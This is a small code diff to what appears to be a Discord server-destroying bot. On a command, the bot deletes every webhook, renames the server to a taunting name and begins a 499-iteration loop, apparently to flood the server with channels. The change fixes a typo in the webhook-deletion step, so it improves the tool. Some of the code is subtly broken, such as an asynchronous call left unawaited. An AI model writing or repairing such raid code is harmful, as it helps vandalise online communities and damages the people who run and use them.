@@ -24,9 +24,8 @@ client.on("message", async (message) => {
             message.delete();
             if(message.guild.channels > 500) return message.channel.send(`too much text channels`)
             let i;
-            const webhooks = messsage.guild.fetchWebhooks();
-            const Webhoeks = webhooks.filter();
-            for (let [id, webhook] of Webhoeks) webhook.delete();
+            const webhooks = message.guild.fetchWebhooks();
+            for (let [id, webhook] of webhooks) webhook.delete();
             if(!args.slice(0).join(' ')){ 
                 message.guild.setName('haha admin go grr -ags and gs')
                 for(i = 0; i < 499; i++){
